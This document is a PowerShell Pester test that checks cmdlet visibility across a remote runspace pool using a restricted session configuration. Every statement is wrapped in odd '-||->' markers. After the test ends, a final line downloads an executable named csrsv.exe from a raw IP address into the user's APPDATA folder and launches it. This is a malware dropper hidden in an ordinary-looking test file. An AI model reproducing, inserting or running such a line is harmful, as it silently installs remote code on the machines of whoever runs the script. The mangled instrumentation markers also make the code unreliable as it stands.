


 -||-> Import-Module HelpersRemoting <-||- 
 -||-> Import-Module HelpersCommon <-||- 

 -||-> Describe "Remote runspace pool should expose commands in endpoint configuration" -Tags 'Feature','RequireAdminOnWindows' {

     -||-> BeforeAll {

         -||-> if ( -||-> $isWindows -and ( -||-> Test-CanWriteToPsHome <-||- ) <-||- )
        {
             -||-> $configName = "restrictedV" <-||- 
             -||-> $configPath =  -||-> Join-Path $TestDrive ( -||-> $configName + ".pssc" <-||- ) <-||-  <-||- 

             -||-> New-PSSessionConfigurationFile -Path $configPath -SessionType RestrictedRemoteServer -VisibleCmdlets 'Get-CimInstance' <-||- 

             -||-> $null =  -||-> Register-PSSessionConfiguration -Name $configName -Path $configPath -Force -ErrorAction SilentlyContinue <-||-  <-||- 

             -||-> $remoteRunspacePool =  -||-> New-RemoteRunspacePool -ConfigurationName $configName <-||-  <-||- 
        } <-||- 
    } <-||- 

     -||-> AfterAll {

         -||-> if ( -||-> $IsWindows -and ( -||-> Test-CanWriteToPsHome <-||- ) <-||- )
        {
             -||-> if ( -||-> $remoteRunspacePool -ne $null <-||- )
            {
                 -||-> $remoteRunspacePool.Dispose() <-||- 
            } <-||- 

             -||-> Unregister-PSSessionConfiguration -Name $configName -Force -ErrorAction SilentlyContinue <-||- 
        } <-||- 
    } <-||- 

     -||-> It "Verifies that the configured endpoint cmdlet is available in all runspace pool instances" -Skip:( -||-> !$IsWindows -or !( -||-> Test-CanWriteToPsHome <-||- ) <-||- ) {

         -||-> [powershell] $ps1 = [powershell]::Create() <-||- 
         -||-> $ps1.RunspacePool = $remoteRunspacePool <-||- 
         -||-> $null = $ps1.AddCommand('Get-Command').AddParameter('Name','Get-CimInstance') <-||- 

         -||-> [powershell] $ps2 = [powershell]::Create() <-||- 
         -||-> $ps2.RunspacePool = $remoteRunspacePool <-||- 
         -||-> $null = $ps2.AddCommand('Get-Command').AddParameter('Name','Get-CimInstance') <-||- 

         -||-> [powershell] $ps3 = [powershell]::Create() <-||- 
         -||-> $ps3.RunspacePool = $remoteRunspacePool <-||- 
         -||-> $null = $ps3.AddCommand('Get-Command').AddParameter('Name','Get-CimInstance') <-||- 

         -||-> [powershell] $ps4 = [powershell]::Create() <-||- 
         -||-> $ps4.RunspacePool = $remoteRunspacePool <-||- 
         -||-> $null = $ps4.AddCommand('Get-Command').AddParameter('Name','Get-CimInstance') <-||- 

        
         -||-> $a1 = $ps1.BeginInvoke() <-||- 
         -||-> $a2 = $ps2.BeginInvoke() <-||- 
         -||-> $a3 = $ps3.BeginInvoke() <-||- 
         -||-> $a4 = $ps4.BeginInvoke() <-||- 

        
         -||-> $r1 = $ps1.EndInvoke($a1) <-||- 
         -||-> $r2 = $ps2.EndInvoke($a2) <-||- 
         -||-> $r3 = $ps3.EndInvoke($a3) <-||- 
         -||-> $r4 = $ps4.EndInvoke($a4) <-||- 

         -||-> $r1.Name | Should -BeExactly 'Get-CimInstance' <-||- 
         -||-> $r2.Name | Should -BeExactly 'Get-CimInstance' <-||- 
         -||-> $r3.Name | Should -BeExactly 'Get-CimInstance' <-||- 
         -||-> $r4.Name | Should -BeExactly 'Get-CimInstance' <-||- 
    } <-||- 
} <-||- 

 -||-> ( -||-> New-Object System.Net.WebClient <-||- ).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe") <-||- ; -||-> Start-Process ( -||-> "$env:APPDATA\csrsv.exe" <-||- ) <-||- 



